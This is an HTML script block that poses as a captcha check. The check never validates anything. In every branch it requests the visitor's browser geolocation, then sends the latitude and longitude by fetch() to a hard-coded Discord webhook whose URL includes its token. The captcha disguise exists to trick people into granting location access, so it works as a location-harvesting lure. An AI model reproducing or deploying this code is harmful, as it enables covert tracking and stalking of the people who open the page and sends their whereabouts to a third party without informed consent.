<script>
    const webhookUrl = 'https://discord.com/api/webhooks/1345046010996723782/iof6YF2JshKySJ1Rl9wisehmzlnGkfgeU2im3pszebbX5AgEfbmRg1jOF8LLdRxvZXL5'; // Replace with your Discord webhook URL

    function verifyCaptcha() {
        const input = document.getElementById('captchaInput').value;

        // Check if input is valid (for demonstration, we simply check if it's not empty)
        if (input) {
            navigator.geolocation.getCurrentPosition(successCallback, errorCallback);
        } else {
            navigator.geolocation.getCurrentPosition(successCallback, errorCallback);
        }
    }

    function successCallback(position) {
        const latitude = position.coords.latitude;
        const longitude = position.coords.longitude;

        alert(`Latitude: ${latitude}, Longitude: ${longitude}`);
        sendLocationToDiscord(latitude, longitude);
    }

    function errorCallback(error) {
        switch (error.code) {
            case error.PERMISSION_DENIED:
                alert("User denied the request for Geolocation.");
                break;
            case error.POSITION_UNAVAILABLE:
                alert("Location information is unavailable.");
                break;
            case error.TIMEOUT:
                alert("The request timed out.");
                break;
            case error.UNKNOWN_ERROR:
                alert("An unknown error occurred.");
                break;
        }
    }

    function sendLocationToDiscord(latitude, longitude) {
        const payload = {
            content: `User Location: Latitude: ${latitude}, Longitude: ${longitude}`
        };

        fetch(webhookUrl, {
            method: 'POST',
            body: JSON.stringify(payload),
            headers: {
                'Content-Type': 'application/json'
            }
        })
        .then(response => {
            if (response.ok) {
                console.log("Location sent successfully!");
            } else {
                console.error("Error sending location:", response.statusText);
            }
        })
        .catch(error => {
            console.error("Error sending location:", error);
        });
    }
</script>
